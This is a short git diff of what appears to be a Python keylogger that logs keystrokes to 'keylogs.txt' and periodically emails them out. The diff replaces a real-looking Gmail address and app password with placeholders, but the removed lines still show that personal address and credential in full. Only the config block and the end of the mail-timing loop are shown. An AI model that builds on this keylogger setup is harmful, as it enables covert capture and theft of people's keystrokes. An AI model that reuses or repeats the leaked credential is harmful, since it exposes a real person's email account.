@@ -4,9 +4,9 @@ from email.message import EmailMessage
 from datetime import datetime
 
 # ================== CONFIG ==================
-SENDER_EMAIL = "chavdahemanshu88@gmail.com"
-PASSWORD = "vdxz yhgq fsid dene"
-REC_EMAIL = "chavdahemanshu88@gmail.com"
+SENDER_EMAIL = "sender_mail@gmail.com"
+PASSWORD = "app_password"
+REC_EMAIL = "reciever_mail@gmail.com"
 LOG_FILE = "keylogs.txt"
 # ============================================
 
@@ -51,3 +51,4 @@ while True:
         last_mail_time = time.time()
 
     time.sleep(2)
+
